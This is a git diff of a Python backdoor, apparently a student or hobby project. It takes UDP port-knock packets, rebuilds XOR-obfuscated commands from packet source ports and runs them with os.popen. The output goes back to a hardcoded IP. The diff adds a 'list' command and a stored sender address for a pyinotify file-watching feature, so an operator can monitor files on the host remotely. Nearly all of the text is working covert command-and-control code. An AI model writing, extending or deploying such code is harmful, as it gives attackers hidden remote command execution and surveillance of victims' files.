@@ -62,9 +62,11 @@ ENCRYPTION_KEY = "zdehjk"
 knockSequence = 0
 command = ''
 cmdLen = 0
-default_dest = '192.168.0.6'
+default_dest = '192.168.0.9'
 process_list = []
 watch_queue = Queue()
+monitor_list = dict()
+other_dest = ''
 
 # Filter is tcpdump format
 FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK[0], KNOCK[1],
@@ -146,7 +148,7 @@ def remoteExecute(packet):
     global knockSequence
     global command
     global cmdLen
-
+    global other_dest
 
     if knockSequence != 5:
         try:
@@ -164,9 +166,13 @@ def remoteExecute(packet):
             #print 'Command Len: ' + str(cmdLen)
             command += chr(packet[0][2].sport)
             if len(command) == cmdLen:
-                print "Running Command: " + command
-                if command.startswith('watch') or command.startswith('remove') or command.startswith('twatch'):
-                    watch_queue.put(command)
+                print "Running Command: " + xor_crypt(command)
+                cmd = xor_crypt(command)
+                if cmd.startswith('watch') or cmd.startswith('remove') or cmd.startswith('twatch') or cmd.startswith('list'):
+                    watch_queue.put(cmd)
+                    other_dest = packet[0][1].src
+                    print packet[0][1].src
+                    print other_dest
                 else:
                     decrypt_command = os.popen(xor_crypt(command))
                     command_result = decrypt_command.read()
@@ -189,10 +195,10 @@ def remoteExecute(packet):
                             print 'Sent: ' + lines[i]
                         except Exception as ex:
                             print ex.message
-                    knockSequence = 0
-                    cmdLen = 0
-                    command = ''
-                    return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
+                knockSequence = 0
+                cmdLen = 0
+                command = ''
+                return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
 
 ######################################################################
 ##	FUNCTION:	    set_proc_name
@@ -411,21 +417,34 @@ def fileMonitor(watch, q):
     notifier = pyinotify.ThreadedNotifier(wm, handler)
     notifier.start()
 
-    wm.add_watch(watch, MASK, rec=True, auto_add=True)
+    monitor_list[watch] = wm.add_watch(watch, MASK, rec=True, auto_add=True)
 
     while True:
         try:
             new_watch = q.get(True, 1)
             x, y = new_watch.split(' ')
+            print x, y
             if x == 'watch':
                 print 'Adding:', y
-                wm.add_watch(new_watch, MASK, rec=True, auto_add=True)
+                monitor_list[y] = wm.add_watch(y, MASK, rec=True, auto_add=True)
             elif x == 'twatch':
                 print 'Adding transient watch:', y
-                wm.watch_transient_file(y, pyinotify.IN_MODIFY, EventHandler)
+                monitor_list[y] = wm.watch_transient_file(y, pyinotify.IN_MODIFY, EventHandler)
+            elif x == 'list':
+                knock(default_dest)
+                length = len(monitor_list)
+                print 'LENGTH:', length
+                if length == 0:
+                    send(IP(dst=default_dest) / UDP(sport=1, dport=SEND_PORT), verbose=0)
+                    send(IP(dst=default_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt('Nothing being watched.'), verbose=0)
+                else:
+                    send(IP(dst=default_dest) / UDP(sport=length, dport=SEND_PORT), verbose=0)
+                    for i in monitor_list.items():
+                        send(IP(dst=default_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt(i[0]), verbose=0)
             else:
                 print 'Removing:', y
                 wm.rm_watch(wm.get_wd(y), rec=True)
+                monitor_list.pop(y)
         except Exception:
             pass
     #notifier.loop()
